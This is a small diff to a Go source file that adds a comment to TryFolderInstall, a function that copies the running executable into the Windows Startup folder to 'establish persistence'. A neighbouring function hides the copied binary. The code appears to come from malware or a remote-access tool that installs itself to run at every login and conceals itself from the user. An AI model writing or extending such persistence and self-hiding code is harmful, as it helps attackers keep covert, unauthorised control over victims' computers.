@@ -54,6 +54,7 @@ func CopyExecutable() error {
 	return HideFile(bin)
 }
 
+//TryFolderInstall attempts to establish persistence by creating a startup shortcut.
 func TryFolderInstall() error {
 	sf := path.Join(os.ExpandEnv("%appdata%"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
 	err := util.CopyFile(os.Args[0], sf)
